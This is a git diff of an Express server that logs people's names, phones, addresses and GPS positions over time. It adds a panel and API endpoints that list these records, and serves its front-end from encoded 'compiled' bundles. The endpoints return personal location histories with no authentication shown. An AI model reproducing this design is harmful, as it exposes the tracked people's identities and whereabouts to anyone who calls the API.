@@ -7,6 +7,10 @@ import helmet from "helmet";
 import morgan from "morgan";
 import dotenv from "dotenv";
 
+// compiled
+import { getDecodedFile as getDecodedFilePublic } from "./public_compiled";
+import { getDecodedFile as getDecodedFilePanel } from "./panel_compiled";
+
 dotenv.config({
   path: ".env",
 });
@@ -23,14 +27,10 @@ app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
 
-app.use(express.static("public"));
-app.get("/", (_req, res) => {
-  res.sendFile("public/index.html");
-});
-
 interface IMaps {
   latitude: number;
   longitude: number;
+  timestamp: string;
 }
 interface ILog {
   id: string;
@@ -38,17 +38,49 @@ interface ILog {
   phone: string;
   address: string;
   maps: IMaps[];
+  lastUpdate: string;
 }
 
+const logPath = path.join(__dirname, "logs");
 app.get("/api/logs", (_req, res) => {
-  const logPath = path.join(__dirname, "logs");
   const logFiles = fs.readdirSync(logPath);
-  const logData = logFiles.map((file) => {
-    const filePath = path.join(logPath, file);
-    const fileData = fs.readFileSync(filePath, "utf-8");
-    return JSON.parse(fileData);
+  res.json({
+    message: "ok!",
+    data: logFiles.map((file) => file.split(".")[0]),
   });
-  res.json(logData);
+});
+app.get("/api/log/:date", (req, res) => {
+  const date = req.params.date;
+  const logFiles = fs.readdirSync(logPath);
+  const dateLog = logFiles.find((file) => file.startsWith(date));
+  if (!dateLog) {
+    return res.status(404).json({ message: "Log not found" });
+  }
+
+  const filePath = path.join(logPath, dateLog);
+  const fileData = fs.readFileSync(filePath, "utf-8");
+  const logData = JSON.parse(fileData);
+  res.json({
+    message: "ok!",
+    data: logData.map((log: ILog) => log.id),
+  });
+});
+app.get("/api/log/:date/:id", (req, res) => {
+  const date = req.params.date;
+  const id = req.params.id;
+  const logFiles = fs.readdirSync(logPath);
+  const dateLog = logFiles.find((file) => file.startsWith(date));
+  if (!dateLog) {
+    return res.status(404).json({ message: "Log not found" });
+  }
+  const filePath = path.join(logPath, dateLog);
+  const fileData = fs.readFileSync(filePath, "utf-8");
+  const logData = JSON.parse(fileData);
+  const log = logData.find((log: ILog) => log.id === id);
+  res.json({
+    message: "ok!",
+    data: log,
+  });
 });
 
 interface ILocationBody {
@@ -64,10 +96,11 @@ interface ILocationBody {
 }
 app.post("/api/location", (req, res) => {
   const body = req.body as ILocationBody;
-  if (!body.id || !body.latitude || !body.longitude) {
-    return res
-      .status(400)
-      .json({ message: "Missing id, latitude or longitude" });
+  if (!body.id) {
+    return res.status(400).json({ message: "Missing id" });
+  }
+  if (!body.latitude || !body.longitude) {
+    return res.status(400).json({ message: "Missing latitude or longitude" });
   }
 
   // log file ke folder logs
@@ -92,12 +125,14 @@ app.post("/api/location", (req, res) => {
       longitude: body.longitude,
       timestamp: now.toISOString(),
     });
+    existingLog.lastUpdate = now.toISOString();
   } else {
     logData.push({
       id: body.id,
       name: body.name,
       phone: body.phone,
       address: body.address,
+      lastUpdate: now.toISOString(),
       maps: [
         {
           latitude: body.latitude,
@@ -110,4 +145,27 @@ app.post("/api/location", (req, res) => {
   fs.writeFileSync(logFile, JSON.stringify(logData));
 
   res.json({ message: "ok!" });
+});
+
+app.use((req, res) => {
+  let endpoint = req.path;
+
+  let isPanel = false;
+  if (endpoint.startsWith("/panel")) {
+    isPanel = true;
+  }
+
+  if (endpoint === "/") {
+    endpoint = "/index.html";
+  } else if (endpoint === "/panel") {
+    endpoint = "/index.html";
+  }
+  const file = isPanel
+    ? getDecodedFilePanel(endpoint)
+    : getDecodedFilePublic(endpoint);
+  if (!file) {
+    return res.status(404).send("File not found");
+  }
+  res.set("Content-Type", file.type);
+  res.send(file.content);
 });
